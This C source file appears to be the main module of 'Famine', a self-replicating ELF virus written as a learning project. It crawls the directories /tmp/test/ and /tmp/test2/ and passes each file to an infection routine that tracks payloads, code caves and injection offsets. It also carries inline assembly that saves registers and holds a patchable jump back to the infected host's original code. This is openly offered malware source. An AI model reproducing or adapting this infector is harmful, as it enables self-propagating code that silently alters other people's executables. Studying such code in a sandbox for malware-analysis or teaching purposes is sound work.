#include "../includes/famine.h"

void clear_env(t_env *env) {
	if (env->obj_cpy)
		syscall_munmap(env->obj_cpy, env->new_obj_size + 1);
	if (env->payload_content)
		syscall_munmap(env->payload_content, env->payload_size + 16);
	if (env->obj_name) {
		syscall_munmap(env->obj_name, env->obj_name_size);
	}
	syscall_munmap(env, sizeof(t_env));
}

t_env *set_env() {
	t_env *env;
	if ((env = syscall_mmap(0, sizeof(t_env), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
		return NULL;
	}
	ft_bzero(env, sizeof(t_env));
	env->obj = NULL;
	env->obj_name = NULL;
	env->obj_name_size = 0;
	env->obj_cpy = NULL;
	env->obj_size = 0;
	env->new_obj_size = 0;
	env->obj_base = 0;
	env->payload_file = NULL;
	env->payload_content = NULL;
	env->payload_size = 0;
	env->load_align = 0;
	env->entrypoint = 0;
	env->plt_offset = 0;
	env->found_code_cave = 0;
	env->found_code_cave_id = 0;
	env->inject_offset = 0;
	env->inject_addr = 0;

	return env;
}


int listdir(char *target) {
	int d;
	char buf[1024];
	struct dirent *dir;
	long nread = 0;
	t_env *env;

	if ((dir = syscall_mmap(0, sizeof(struct dirent), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
		return -1;
	}
	d = syscall_openat(AT_FDCWD, target, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC);
	if (d > 0) {
		ft_bzero(dir, sizeof(struct dirent));
		while ((nread = syscall_getdents(d, buf, 1024)) > 0) {
			for (long bpos = 0; bpos < nread;) {
				dir = (struct dirent *) (buf + bpos);
				if (ft_strcmp(dir->d_name, ".") != 0 && ft_strcmp(dir->d_name, "..") != 0) {
					if ((env = set_env()) == NULL) {
						return -1;
					}
					env->obj_name_size = ft_strlen(target) + ft_strlen(dir->d_name) + 1;
					if ((env->obj_name = syscall_mmap(0, env->obj_name_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
						return -1;
					}
					ft_bzero(env->obj_name, env->obj_name_size);
					ft_strcpy(env->obj_name, target);
					ft_strcat(env->obj_name, dir->d_name);
					read_obj(env);
					clear_env(env);
				}
				bpos += dir->d_reclen;
			}
		}
		syscall_close(d);
	}
	return 0;
}

int main(void) {
	__asm__(
		// save registers
		"push %rsp \n"
		"push %rax \n"
		"push %rcx \n"
		"push %rdx \n"
		"push %rbx \n"
		"push %rsi \n"
		"push %rdi \n"
		"push %rbp \n"
		"push %r8 \n"
		"push %r9 \n"
		"push %r10 \n"
		"push %r11 \n"
		"push %r12 \n"
		"push %r13 \n"
		"push %r14 \n"
		"push %r15 \n"
	);

	// signature
	char *str = "Famine version 1.0 (c)oded by eparisot\n";
	if (DEBUG) syscall_write(1, str, 39);

	// folders crawl
	listdir("/tmp/test/");
	listdir("/tmp/test2/");

	__asm__(
		// restore registers
		"pop %r15 \n"	
		"pop %r14 \n"
		"pop %r13 \n"
		"pop %r12 \n"
		"pop %r11 \n"				 
		"pop %r10 \n"
		"pop %r9 \n"
		"pop %r8 \n"
		"pop %rbp \n"
		"pop %rdi \n"
		"pop %rsi \n"
		"pop %rbx \n"
		"pop %rdx \n"
		"pop %rcx \n"
		"pop %rax \n"
		"pop %rsp \n"
		"add $0x18, %rsp \n" // restore stack so argv is in correct place
		// set return here for fist call to avoid segfault, will be replaced by NOP in subsequent runs
		"leave \n" 
		"ret \n"
		// jump back to main
		"jmp . + 5 + 0x41414141 \n"
		// anchor to look for to replace jmp address (0x42424242 location - 7)
		"push 0x42424242 \n"
	);

	return 0;
}